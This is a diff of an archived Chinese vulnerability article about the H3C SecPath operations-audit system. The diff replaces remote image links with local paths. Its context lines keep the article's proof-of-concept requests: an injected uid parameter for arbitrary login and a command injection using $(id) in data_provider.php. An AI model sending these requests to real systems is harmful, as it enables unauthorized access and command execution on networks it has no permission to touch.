@@ -64,9 +64,9 @@ relation_type: "duplicate_of"
 
 > 本文由 [简悦 SimpRead](http://ksria.com/simpread/) 转码， 原文地址 [mp.weixin.qq.com](https://mp.weixin.qq.com/s/rt8lJaLUTVuZd187zrruMw)
 
-![](https://mmbiz.qpic.cn/mmbiz_jpg/ibicicIH182el4ZtwUTIlboZYRXjrRmK33Z3PMgtzbIn6N90u65gaT5swNxWFd56DlRDd7Ixz2MSMzVicHZKHdonpA/640?wx_fmt=jpeg)
+![](../../.resource/remote/e2d4a13e58aaec619b1f14de57af61649ad7cc27919ffa8d0f6869164bc2deca.jpg)
 
-**![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7f0qibYGLgIyO0zpTSeV1I6m1WibjS1ggK9xf8lYM44SK40O6uRLTOAtiaM0xYOqZicJ2oDdiaWFianIjQ/640?wx_fmt=png)**
+**![](../../.resource/remote/62ec45fc20ac500854a811a22154a8a90a49ed2e322f774d1e88a948bb94d039.png)**
 
 **一****：漏洞描述🐑**
 
@@ -87,7 +87,7 @@ app="H3C-SecPath-运维审计系统"
 
 **登录页面如下**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YkLxBKcXjvA2m2Hqx2I4MYPomV41q8BWLM7jCoBibibqlurHDRtZIVkxvVibxWGH53kJE5iaSkPjTibg/640?wx_fmt=png)
+![](../../.resource/remote/e3420f51c6499614c7b98fafe22c341e6050f99d3496897952767fa4bda2cd69.png)
 
 **先通过任意用户登录获取 Cookie**
 
@@ -95,13 +95,13 @@ app="H3C-SecPath-运维审计系统"
 /audit/gui_detail_view.php?token=1&id=%5C&uid=%2Cchr(97))%20or%201:%20print%20chr(121)%2bchr(101)%2bchr(115)%0d%0a%23&login=admin
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YkLxBKcXjvA2m2Hqx2I4M2iaziauZcVytic23fmMh5ylenIeuP4rEVOeXm6MuF0BCuwwoZEMCL4eSg/640?wx_fmt=png)
+![](../../.resource/remote/43e35b1706145731ebb66d926e1d715339c442391db47ca5c0067a3ca627ca00.png)
 
 ```
 /audit/data_provider.php?ds_y=2019&ds_m=04&ds_d=02&ds_hour=09&ds_min40&server_cond=&service=$(id)&identity_cond=&query_type=all&format=json&browse=true
 ```
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7YkLxBKcXjvA2m2Hqx2I4MHzBlIhGf8iaRVL6BW230n4mlwWjDicDn8wNZ5eNVwHg9KuZNpbbhXlRQ/640?wx_fmt=png)
+![](../../.resource/remote/08ecded165542a6a8ad3b8852843882c51b6b687d08314a7c2c39fa8c8c53f8d.png)
 
  ****四:  关于文库🦉****
 
@@ -113,7 +113,7 @@ app="H3C-SecPath-运维审计系统"
 
 **https://github.com/PeiQi0/PeiQi-WIKI-POC**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el4cpD8uQPH24EjA7YPtyZEP33zgJyPgfbMpTJGFD7wyuvYbicc1ia7JT4O3r3E99JBicWJIvcL8U385Q/640?wx_fmt=png)
+![](../../.resource/remote/b429b9cbd75e2cfd9120725a6fe2e76b51d832d671e09e333c40dae5e398356c.png)
 
 最后
 --
@@ -130,7 +130,7 @@ app="H3C-SecPath-运维审计系统"
 
 **知识星球里会持续发布一些漏洞公开信息和技术文章~**
 
-![](https://mmbiz.qpic.cn/mmbiz_png/ibicicIH182el7iafXcY0OcGbVuXIcjiaBXZuHPQeSEAhRof2olkAM9ZghicpNv0p8rRbtNCZJL4t82g15Va8iahlCWeg/640?wx_fmt=png)
+![](../../.resource/remote/ccb7bc5ce7b30b8f99bdeba963cbbbc47267f787b2b78c5fe58adfbaa5f5a97c.png)
 
 **由于传播、利用此文所提供的信息而造成的任何直接或者间接的后果及损失，均由使用者本人负责，文章作者不为此承担任何责任。**
 
